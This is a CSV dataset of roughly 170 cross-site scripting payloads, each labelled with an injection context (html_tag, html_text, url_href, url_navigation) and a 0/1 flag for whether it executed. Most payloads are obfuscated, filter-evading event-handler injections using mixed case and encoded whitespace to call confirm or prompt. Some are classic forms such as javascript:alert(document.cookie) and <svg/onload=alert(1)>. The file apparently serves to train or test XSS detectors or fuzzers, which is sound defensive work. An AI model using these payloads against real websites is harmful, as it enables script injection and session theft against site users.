payload,context,exec,combined
"<D3v/+/onPOiNTERentEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3v/+/onPOiNTERentEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<A%0doNPOInTerENter%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A%0doNPOInTerENter%0d=%0d[8].find(confirm)>v3dm0s
<img src=x onerror=,html_text,0,CONTEXT_html_text <img src=x onerror=
<a%0aONPOintereNTer%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aONPOintereNTer%0a=%0a(confirm)()>v3dm0s
<D3v%0donMoUSeOVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0donMoUSeOVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
"<a%09onpointERenTeR%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <a%09onpointERenTeR%0d=%0da=prompt,a()>v3dm0s"
<D3V/+/onMouseOvEr%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V/+/onMouseOvEr%0a=%0aconfirm()>v3dm0s
<a%09onPoInTEReNTEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%09onPoInTEReNTEr%0d=%0dconfirm()>v3dm0s
<A%0aoNpoiNTEReNTeR%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0aoNpoiNTEReNTeR%0a=%0a[8].find(confirm)%0dx>v3dm0s
<A%0aoNpOiNTerEnteR+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A%0aoNpOiNTerEnteR+=+confirm()%0dx>v3dm0s
<D3v%0dOnPoiNTerEnTEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0dOnPoiNTerEnTEr%0a=%0aconfirm()%0dx>v3dm0s
randomvalue,html_text,0,CONTEXT_html_text randomvalue
"<D3v%09oNpoiNTeReNteR+=+a=prompt,a()%0dx>v3dm0s",url_navigation,0,"CONTEXT_url_navigation <D3v%09oNpoiNTeReNteR+=+a=prompt,a()%0dx>v3dm0s"
<D3v/+/ONPoinTeRENTER%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/ONPoinTeRENTER%0a=%0a(prompt)``>v3dm0s
<dEtAiLs%0dONPoINtErEnter%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <dEtAiLs%0dONPoINtErEnter%0a=%0aconfirm()%0dx//
<D3V/+/onPointerEnteR%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/onPointerEnteR%0d=%0dconfirm()%0dx>v3dm0s
"data:text/html,<script>alert(document.cookie)</script>",html_tag,0,"CONTEXT_html_tag data:text/html,<script>alert(document.cookie)</script>"
<D3v%0aoNMousEOvER+=+(confirm)()>v3dm0s,html_text,0,CONTEXT_html_text <D3v%0aoNMousEOvER+=+(confirm)()>v3dm0s
<html/+/OnmOUSEOveR%0a=%0aconfirm()%0dx>,html_text,0,CONTEXT_html_text <html/+/OnmOUSEOveR%0a=%0aconfirm()%0dx>
<a%09oNmoUSEOveR%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09oNmoUSEOveR%0a=%0aconfirm()>v3dm0s
<a%0dOnPOintEreNtEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0dOnPOintEreNtEr%0a=%0aconfirm()%0dx>v3dm0s
"<htmL%0donPoiNTerEnTEr%0a=%0aa=prompt,a()//",html_tag,0,"CONTEXT_html_tag <htmL%0donPoiNTerEnTEr%0a=%0aa=prompt,a()//"
javascript:alert`1`,html_tag,0,CONTEXT_html_tag javascript:alert`1`
<D3V%09onPoinTerenteR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09onPoinTerenteR%0a=%0a(prompt)``%0dx>v3dm0s
<DEtailS%09oNpOINTerEnter%0d=%0d(confirm)()>,html_text,0,CONTEXT_html_text <DEtailS%09oNpOINTerEnter%0d=%0d(confirm)()>
'singlequotes',html_text,0,CONTEXT_html_text 'singlequotes'
<DeTAiLs%0donTOgGLE%0d=%0dconfirm()//,html_tag,0,CONTEXT_html_tag <DeTAiLs%0donTOgGLE%0d=%0dconfirm()//
"<a%0aOnPoIntERENTER+=+a=prompt,a()>v3dm0s",html_text,0,"CONTEXT_html_text <a%0aOnPoIntERENTER+=+a=prompt,a()>v3dm0s"
<A%09onPOINtEReNter%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09onPOINtEReNter%09=%09confirm()%0dx>v3dm0s
<d3V%0dOnPoinTEReNTeR%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dOnPoinTEReNTeR%09=%09(prompt)``>v3dm0s
<DeTaIls%0doNTOGgLe%0d=%0dconfirm()>,html_text,0,CONTEXT_html_text <DeTaIls%0doNTOGgLe%0d=%0dconfirm()>
<d3v%09ONpOinterENTer%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09ONpOinterENTer%09=%09confirm()%0dx>v3dm0s
<d3V%0doNmoUseoVER%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0doNmoUseoVER%0d=%0d(confirm)()%0dx>v3dm0s
<d3v/+/OnMouseOvER%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/OnMouseOvER%0d=%0d(confirm)()>v3dm0s
<D3v%09OnpointeRENter%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%09OnpointeRENter%0a=%0aconfirm()%0dx>v3dm0s
<A%09oNPoinTERenteR%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%09oNPoinTERenteR%09=%09confirm()>v3dm0s
"<hTMl%0aOnPOINterenTer%09=%09a=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <hTMl%0aOnPOINterenTer%09=%09a=prompt,a()%0dx//"
<d3v%09oNMOUsEOVer%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%09oNMOUsEOVer%09=%09confirm()>v3dm0s
<D3V/+/OnmoUSeoVeR%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/OnmoUSeoVeR%0a=%0aconfirm()%0dx>v3dm0s
<d3V%0donpoINtErentEr%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0donpoINtErentEr%09=%09(confirm)()>v3dm0s
"<a%0dOnmOusEoVEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%0dOnmOusEoVEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<A%09oNPoiNteRenTEr%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09oNPoiNteRenTEr%09=%09confirm()%0dx>v3dm0s
<d3V/+/oNPOiNtERenTeR%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/oNPOiNtERenTeR%0d=%0d(confirm)()%0dx>v3dm0s
<dETAilS%09ONPoiNTERENTer%0a=%0a(confirm)()//,html_text,0,CONTEXT_html_text <dETAilS%09ONPoiNTERENTer%0a=%0a(confirm)()//
<A%0dOnmoUsEOver+=+(prompt)``%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0dOnmoUsEOver+=+(prompt)``%0dx>v3dm0s
<detaILs%09onTOGgLe%0a=%0a(confirm)()//,html_tag,0,CONTEXT_html_tag <detaILs%09onTOGgLe%0a=%0a(confirm)()//
<d3V%0aONPoINTeREnteR+=+(confirm)()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <d3V%0aONPoINTeREnteR+=+(confirm)()%0dx>v3dm0s
<htML/+/ONPoiNTeReNTEr%0a=%0a(confirm)()>,html_tag,0,CONTEXT_html_tag <htML/+/ONPoiNTeReNTEr%0a=%0a(confirm)()>
"<htmL%0aONMOUsEoVer%0d=%0da=prompt,a()//",html_tag,0,"CONTEXT_html_tag <htmL%0aONMOUsEoVer%0d=%0da=prompt,a()//"
<htML/+/OnMOUSeOveR%0a=%0a(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <htML/+/OnMOUSeOveR%0a=%0a(prompt)``%0dx//
<HTML%0dOnMoUseOver%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <HTML%0dOnMoUseOver%09=%09confirm()//
<d3V%0dOnmouseovEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dOnmouseovEr%0d=%0dconfirm()%0dx>v3dm0s
<D3V%0aOnmouSeOVEr%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aOnmouSeOVEr%0a=%0aconfirm()>v3dm0s
<D3v/+/onPOiNtereNTER%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3v/+/onPOiNtereNTER%0a=%0aconfirm()>v3dm0s
"<HTML%0aoNpoINTEreNteR%09=%09a=prompt,a()>",html_tag,0,"CONTEXT_html_tag <HTML%0aoNpoINTEreNteR%09=%09a=prompt,a()>"
"<Html/+/oNpoIntereNteR%0d=%0da=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <Html/+/oNpoIntereNteR%0d=%0da=prompt,a()%0dx>"
"<A%09ONpOInTeRenteR%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%09ONpOInTeRenteR%09=%09a=prompt,a()%0dx>v3dm0s"
<HtML%0aoNpOiNTereNTer%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <HtML%0aoNpOiNTereNTer%0a=%0aconfirm()%0dx//
<dEtAIlS%0aoNpointERenTeR%0a=%0a(prompt)``>,html_tag,0,CONTEXT_html_tag <dEtAIlS%0aoNpointERenTeR%0a=%0a(prompt)``>
""" onmouseenter=alert(1) """,html_tag,0,"CONTEXT_html_tag "" onmouseenter=alert(1) """
<d3V%0aoNpoINTeRentER+=+[8].find(confirm)%0dx>v3dm0s,html_text,0,CONTEXT_html_text <d3V%0aoNpoINTeRentER+=+[8].find(confirm)%0dx>v3dm0s
<deTaIls%0dOnPoiNTEREnTer%0a=%0aconfirm()>,html_text,0,CONTEXT_html_text <deTaIls%0dOnPoiNTEREnTer%0a=%0aconfirm()>
<d3v/+/oNmoUseoVeR%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/oNmoUseoVeR%0a=%0aconfirm()%0dx>v3dm0s
<A/+/OnMousEoVER%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <A/+/OnMousEoVER%0a=%0a(confirm)()>v3dm0s
"<deTAIls%09ONpoINTEREnTER+=+a=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <deTAIls%09ONpoINTEREnTER+=+a=prompt,a()%0dx>"
<DEtAilS/+/onpOiNteReNTER+=+(prompt)``>,html_text,0,CONTEXT_html_text <DEtAilS/+/onpOiNteReNTER+=+(prompt)``>
javascript:alert(document.cookie),url_href,1,CONTEXT_url_href javascript:alert(document.cookie)
<a%09onpOInTerENTeR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09onpOInTerENTeR%0d=%0d(prompt)``>v3dm0s
<htMl/+/oNmoUSeOvER%0d=%0dconfirm()%0dx>,html_text,0,CONTEXT_html_text <htMl/+/oNmoUSeOvER%0d=%0dconfirm()%0dx>
<A/+/OnpOInteReNtEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A/+/OnpOInteReNtEr%0d=%0dconfirm()>v3dm0s
<dEtAILs%0aONtOgGLE%0a=%0aconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <dEtAILs%0aONtOgGLE%0a=%0aconfirm()%0dx>
<HTmL%0aOnPOinTERENTeR%0d=%0d(prompt)``//,html_text,0,CONTEXT_html_text <HTmL%0aOnPOinTERENTeR%0d=%0d(prompt)``//
<d3v%09ONpOinterENTer%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%09ONpOinterENTer%09=%09confirm()%0dx>v3dm0s
<HTmL%09OnPOINTErEnter%09=%09[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <HTmL%09OnPOINTErEnter%09=%09[8].find(confirm)//
"<d3V%09oNpoiNTerENTER%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3V%09oNpoiNTerENTER%09=%09a=prompt,a()>v3dm0s"
"<A%0aOnPointErENTeR%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A%0aOnPointErENTeR%09=%09a=prompt,a()>v3dm0s"
<detAILS%0dONTOgglE%09=%09confirm()>,html_tag,0,CONTEXT_html_tag <detAILS%0dONTOgglE%09=%09confirm()>
<d3V%09onmOUsEOVER%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <d3V%09onmOUsEOVER%09=%09(prompt)``>v3dm0s
<detaILs%09ontoGGLE+=+[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <detaILs%09ontoGGLE+=+[8].find(confirm)%0dx>
"<dEtAiLS%0dOnTOgGLe%0a=%0aa=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <dEtAiLS%0dOnTOgGLe%0a=%0aa=prompt,a()%0dx//"
"<html/+/oNpoINTErENTER%0d=%0da=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <html/+/oNpoINTErENTER%0d=%0da=prompt,a()%0dx//"
<deTAiLS/+/ONpOintereNTER+=+[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <deTAiLS/+/ONpOintereNTER+=+[8].find(confirm)%0dx//
<DeTaIls/+/oNpointEREntEr%09=%09confirm()>,html_tag,0,CONTEXT_html_tag <DeTaIls/+/oNpointEREntEr%09=%09confirm()>
"<d3V%09oNpoInTereNter%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3V%09oNpoInTereNter%09=%09a=prompt,a()%0dx>v3dm0s"
"<D3v%0donmouSeOveR%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <D3v%0donmouSeOveR%0d=%0da=prompt,a()>v3dm0s"
<a%09onmousEOVER+=+(confirm)()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <a%09onmousEOVER+=+(confirm)()%0dx>v3dm0s
<d3v%0aonmOusEOVEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aonmOusEOVEr%0d=%0d[8].find(confirm)>v3dm0s
"<a%0donmOuseovER+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CONTEXT_html_text <a%0donmOuseovER+=+a=prompt,a()%0dx>v3dm0s"
<HTmL%0dONpOinTeRenTer%09=%09[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <HTmL%0dONpOinTeRenTer%09=%09[8].find(confirm)//
<hTml%0dONPoIntErentER%0d=%0d[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <hTml%0dONPoIntErentER%0d=%0d[8].find(confirm)%0dx//
<a/+/OnPOINterEnTER+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <a/+/OnPOINterEnTER+=+confirm()%0dx>v3dm0s
"<A%0donpOIntEreNTer%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <A%0donpOIntEreNTer%0a=%0aa=prompt,a()%0dx>v3dm0s"
""" onmouseleave=alert(1) """,html_tag,0,"CONTEXT_html_tag "" onmouseleave=alert(1) """
<HTML/+/ONmouSEoVer%0d=%0d[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <HTML/+/ONmouSEoVer%0d=%0d[8].find(confirm)%0dx>
<hTml%0donpoINTeReNteR%09=%09(confirm)()%0dx//,html_text,0,CONTEXT_html_text <hTml%0donpoINTeReNteR%09=%09(confirm)()%0dx//
<dETAILS%09oNpOINTEREnTER%0a=%0a(confirm)()>,html_tag,0,CONTEXT_html_tag <dETAILS%09oNpOINTEREnTER%0a=%0a(confirm)()>
"<a%0aOnpoiNtERENTER%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%0aOnpoiNtERENTER%09=%09a=prompt,a()%0dx>v3dm0s"
<deTAIlS%09oNTogGlE+=+confirm()//,html_text,0,CONTEXT_html_text <deTAIlS%09oNTogGlE+=+confirm()//
<DEtAILs/+/ONPoiNTerENTER+=+confirm()>,html_tag,0,CONTEXT_html_tag <DEtAILs/+/ONPoiNTerENTER+=+confirm()>
<HtMl%0aoNPOiNteREntEr%0d=%0d[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <HtMl%0aoNPOiNteREntEr%0d=%0d[8].find(confirm)>
<HtMl%0dOnPoinTEREnTeR%0a=%0aconfirm()>,html_text,0,CONTEXT_html_text <HtMl%0dOnPoinTEREnTeR%0a=%0aconfirm()>
<hTmL%0dONmoUSEover+=+(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <hTmL%0dONmoUSEover+=+(confirm)()%0dx>
<HtMl/+/oNPoinTerEnteR%0d=%0dconfirm()%0dx>,html_text,0,CONTEXT_html_text <HtMl/+/oNPoinTerEnteR%0d=%0dconfirm()%0dx>
<A%0donMOusEOver%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0donMOusEOver%0a=%0aconfirm()>v3dm0s
<A%0aONpoINtErenter%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <A%0aONpoINtErenter%09=%09(confirm)()>v3dm0s
"<DeTAiLs%0dONpoInTErENTER%0a=%0aa=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <DeTAiLs%0dONpoInTErENTER%0a=%0aa=prompt,a()%0dx>"
<dETAiLS%0aoNtOggLE%0a=%0a[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <dETAiLS%0aoNtOggLE%0a=%0a[8].find(confirm)%0dx//
<html%0dONpointERenter+=+[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <html%0dONpointERenter+=+[8].find(confirm)>
"<A%0aOnmOUseOVEr%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A%0aOnmOUseOVEr%09=%09a=prompt,a()>v3dm0s"
<D3V%0aOnMoUSeOVeR%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aOnMoUSeOVeR%0a=%0aconfirm()>v3dm0s
<detaiLs%09onpOiNTERentER%09=%09(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <detaiLs%09onpOiNTERentER%09=%09(confirm)()%0dx//
"<Html%0aoNMOuSEovEr%0d=%0da=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <Html%0aoNMOuSEovEr%0d=%0da=prompt,a()%0dx//"
"<hTMl%0aOnPOINterenTer%09=%09a=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <hTMl%0aOnPOINterenTer%09=%09a=prompt,a()%0dx//"
<d3v%0dONMOUSeOvER%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0dONMOUSeOvER%0d=%0dconfirm()>v3dm0s
<htML/+/OnmOUSEOVer%09=%09confirm()>,html_text,0,CONTEXT_html_text <htML/+/OnmOUSEOVer%09=%09confirm()>
<HTML%09ONpOiNtErEnter%09=%09(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <HTML%09ONpOiNtErEnter%09=%09(confirm)()%0dx//
<DEtAILs/+/onTogGLE%0a=%0a(confirm)()%0dx>,html_text,0,CONTEXT_html_text <DEtAILs/+/onTogGLE%0a=%0a(confirm)()%0dx>
<deTAILS/+/onTOGGle%0a=%0a[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <deTAILS/+/onTOGGle%0a=%0a[8].find(confirm)%0dx>
"<hTMl/+/ONmOuseovEr%09=%09a=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <hTMl/+/ONmOuseovEr%09=%09a=prompt,a()%0dx>"
<dETaiLs/+/OnpoinTeRenter%0d=%0d(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <dETaiLs/+/OnpoinTeRenter%0d=%0d(confirm)()%0dx>
"<detAILs%0dOntOGgle%0d=%0da=prompt,a()//",html_text,0,"CONTEXT_html_text <detAILs%0dOntOGgle%0d=%0da=prompt,a()//"
<dETaIlS/+/OntOGGlE%0d=%0dconfirm()%0dx//,html_text,0,CONTEXT_html_text <dETaIlS/+/OntOGGlE%0d=%0dconfirm()%0dx//
<d3V/+/OnpOINTERENTER%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/OnpOINTERENTER%0a=%0a[8].find(confirm)>v3dm0s
<a%0dONMousEOVeR%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <a%0dONMousEOVeR%09=%09(prompt)``>v3dm0s
"<d3v/+/ONPoinTErEnTER%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <d3v/+/ONPoinTErEnTER%09=%09a=prompt,a()%0dx>v3dm0s"
<detAils%09onPOinTEreNter+=+confirm()//,html_tag,0,CONTEXT_html_tag <detAils%09onPOinTEreNter+=+confirm()//
<a%09OnPOintERenter%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09OnPOintERenter%09=%09(confirm)()>v3dm0s
<hTML%0donMOuseOVeR%0a=%0a(prompt)``>,html_tag,0,CONTEXT_html_tag <hTML%0donMOuseOVeR%0a=%0a(prompt)``>
<a%0aoNMousEoveR%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aoNMousEoveR%0d=%0d[8].find(confirm)%0dx>v3dm0s
<HTML%0aonMouSeovEr+=+(confirm)()%0dx>,html_text,0,CONTEXT_html_text <HTML%0aonMouSeovEr+=+(confirm)()%0dx>
<HTML%09ONMoUSEOvEr%0a=%0a(confirm)()>,html_text,0,CONTEXT_html_text <HTML%09ONMoUSEOvEr%0a=%0a(confirm)()>
<a%0doNMoUseovER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0doNMoUseovER%0d=%0dconfirm()%0dx>v3dm0s
<A%09ONpoInteReNTER%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09ONpoInteReNTER%0d=%0d[8].find(confirm)%0dx>v3dm0s
<d3v/+/onmousEoVer+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <d3v/+/onmousEoVer+=+[8].find(confirm)%0dx>v3dm0s
<A/+/oNPOIntERenTer%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/oNPOIntERenTer%09=%09(confirm)()%0dx>v3dm0s
<D3V%0donmOuSeOveR%09=%09(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0donmOuSeOveR%09=%09(prompt)``>v3dm0s
"<HtMl%09onmOuseOvEr%0d=%0da=prompt,a()>",html_text,0,"CONTEXT_html_text <HtMl%09onmOuseOvEr%0d=%0da=prompt,a()>"
<DetAiLS%0donPoINTeRENTER%09=%09(prompt)``//,html_tag,0,CONTEXT_html_tag <DetAiLS%0donPoINTeRENTER%09=%09(prompt)``//
"<DetAILs%09oNtOGgLE%0a=%0aa=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <DetAILs%09oNtOGgLE%0a=%0aa=prompt,a()%0dx>"
<HtML%0aOnPoiNtereNtER%09=%09confirm()>,html_tag,0,CONTEXT_html_tag <HtML%0aOnPoiNtereNtER%09=%09confirm()>
<a%0dONMOusEovER%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%0dONMOusEovER%09=%09confirm()>v3dm0s
"<HTML%0aONmOusEOVER%09=%09a=prompt,a()//",html_text,0,"CONTEXT_html_text <HTML%0aONmOusEOVER%09=%09a=prompt,a()//"
<d3V%0aoNMOuSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0aoNMOuSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s
"<A%0aoNMoUsEoVER%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <A%0aoNMoUsEoVER%09=%09a=prompt,a()%0dx>v3dm0s"
"<DETAiLs%0dONtOGGLE+=+a=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <DETAiLs%0dONtOGGLE+=+a=prompt,a()%0dx//"
"<d3v%0donpOinteRENtER%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3v%0donpOinteRENtER%09=%09a=prompt,a()%0dx>v3dm0s"
<d3V%0dOnpOiNTeREnter%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dOnpOiNTeREnter%09=%09[8].find(confirm)%0dx>v3dm0s
<a/+/OnPOINteRenTEr%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a/+/OnPOINteRenTEr%0a=%0aconfirm()>v3dm0s
<html%0aonpoInTERENtEr%0a=%0aconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <html%0aonpoInTERENtEr%0a=%0aconfirm()%0dx>
<D3V%0aonPOinTErENter+=+[8].find(confirm)%0dx>v3dm0s,html_text,0,CONTEXT_html_text <D3V%0aonPOinTErENter+=+[8].find(confirm)%0dx>v3dm0s
<hTml%09ONmoUSeOVER%0d=%0d(confirm)()//,html_tag,0,CONTEXT_html_tag <hTml%09ONmoUSeOVER%0d=%0d(confirm)()//
<d3V%0doNmousEOVER+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <d3V%0doNmousEOVER+=+confirm()>v3dm0s
<A/+/oNpOINtErenter%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/oNpOINtErenter%09=%09(prompt)``%0dx>v3dm0s
<DETaiLS%0dontOGglE%0d=%0d(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <DETaiLS%0dontOGglE%0d=%0d(confirm)()%0dx>
<HtML%09oNmOuseoVer+=+confirm()>,html_text,0,CONTEXT_html_text <HtML%09oNmOuseoVer+=+confirm()>
<a%0doNmoUsEOvER+=+[8].find(confirm)%0dx>v3dm0s,html_text,0,CONTEXT_html_text <a%0doNmoUsEOvER+=+[8].find(confirm)%0dx>v3dm0s
<svg/onload=alert(1)>,html_text,0,CONTEXT_html_text <svg/onload=alert(1)>
<DETAILs%09ONPoiNTEREnteR+=+(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <DETAILs%09ONPoiNTEREnteR+=+(prompt)``%0dx>
<a%0aOnPointErEntEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aOnPointErEntEr%0a=%0aconfirm()%0dx>v3dm0s
"<HtMl%09onmOuseOvEr%0d=%0da=prompt,a()>",html_tag,0,"CONTEXT_html_tag <HtMl%09onmOuseOvEr%0d=%0da=prompt,a()>"
<DETaIls%0aoNtogGLE%0d=%0d(prompt)``//,html_text,0,CONTEXT_html_text <DETaIls%0aoNtogGLE%0d=%0d(prompt)``//
"<hTMl/+/ONmOuseovEr%09=%09a=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <hTMl/+/ONmOuseovEr%09=%09a=prompt,a()%0dx>"
